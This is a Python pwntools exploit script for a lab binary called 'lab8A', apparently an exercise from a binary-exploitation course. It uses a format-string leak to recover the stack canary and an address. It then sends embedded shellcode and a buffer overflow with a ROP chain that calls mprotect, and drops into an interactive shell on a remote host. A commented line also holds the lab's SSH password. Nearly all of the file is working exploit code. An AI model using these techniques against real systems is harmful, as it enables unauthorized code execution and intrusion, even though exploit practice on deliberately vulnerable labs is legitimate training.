from pwn import *
from time import sleep
e=ELF("./lab8A")
#s=ssh(user='lab8A',password='Th@t_w@5_my_f@v0r1t3_ch@11',host='192.168.1.20',port=22)
#p=s.run("/levels/lab08/lab8A")

#p=e.process()
#context.log_level='debug'
#gdb.attach(p,gdbscript="b selectABook\nb *selectABook+213")
p=remote("192.168.1.20",8841)

p.recv()
sleep(1)
#https://www.exploit-db.com/shellcodes/47890
shellcode=(b"\xeb\x3c\x5e\x56\x31\xdb\x31\xc9\x31\xd2\xb2\x32\xc0\x06"
        b"\x04\xf6\x16\x80\x06\x02\x80\x36\x2c\x46\x38\xd1\x74\x04"
        b"\xfe\xc1\xeb\xec\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xc9"
        b"\x8a\x1c\x06\x38\xd1\x74\x12\x8a\x5c\x06\x01\x88\x1f\x47"
        b"\xfe\xc1\x04\x02\xeb\xec\xe8\xbf\xff\xff\xff\x4e\xd1\x51"
        b"\xb4\x58\x37\xdb\x55\xef\x3d\xef\xbd\x2a\x59\xdb\x81\xdb"
        b"\x56\xef\xae\x3b\x1a\xcb\xfa\xfb\x43\xc5\x49\x23\x12\x58"
        b"\xd2\xc5\xee\x33\x82\x28\x49\xc5\xc3\x43\x30\x56\xcb\xad"
        b"\xe1\x02\x8b\x55\x84")
p.sendline(b"%130$p"+b"%1$p"+b"/\x00\x90"+shellcode+b"A"*(512-len(b"%130$p%1$p/\x00\x90"+shellcode)))
sleep(1)
p.recvuntil(b"[+] Enter Your Favorite Author's Last Name: ")
sleep(1)
leak=p.recvuntil(b"/").replace(b'/',b'')
sleep(1)
canary=int(leak[0:10][2:].decode(),16)
addr=int(leak[10:20][2:].decode(),16)
log.info(f"canary: {hex(canary)}")
log.info(f"addr: {hex(addr)}")
log.info(f"shellcode: {hex(addr+12)}")
log.info("Maybe some addrs contain bad chars! Try again, again and again.")
p.recv()
sleep(1)
rop_chain =p32(e.sym["mprotect"])
rop_chain+=p32(addr+12)
rop_chain+=p32(addr >> 8 >> 4 << 4 << 4 << 4)
rop_chain+=p32(0x0fffffff)
rop_chain+=p32(7)
p.sendline(b"A\x00"+b"B"*510+p32(canary)+b"C"*4+rop_chain)
sleep(1)
p.recv()
sleep(1)
context.log_level='info'
p.interactive()
